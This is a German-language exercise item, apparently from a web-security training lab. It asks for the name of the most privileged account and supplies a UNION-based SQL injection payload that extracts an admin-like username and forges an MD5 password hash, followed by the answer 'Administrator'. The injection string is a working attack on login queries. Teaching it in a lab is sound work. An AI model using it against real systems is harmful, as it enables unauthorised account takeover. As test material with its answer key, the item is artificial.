Finden Sie den Nutzernamen des Accounts mit den höchsten Rechten heraus.

Tipp: Mit dem Schlüsselwort `LIKE` können Sie nach Mustern in Strings suchen.

Statement:
' AND 1=0 UNION SELECT (SELECT name FROM people WHERE name LIKE '_dmin%'), MD5('pass'), 1, 1;--

>>6) Geben Sie den gefundenen Nutzernamen an.<<
     === Administrator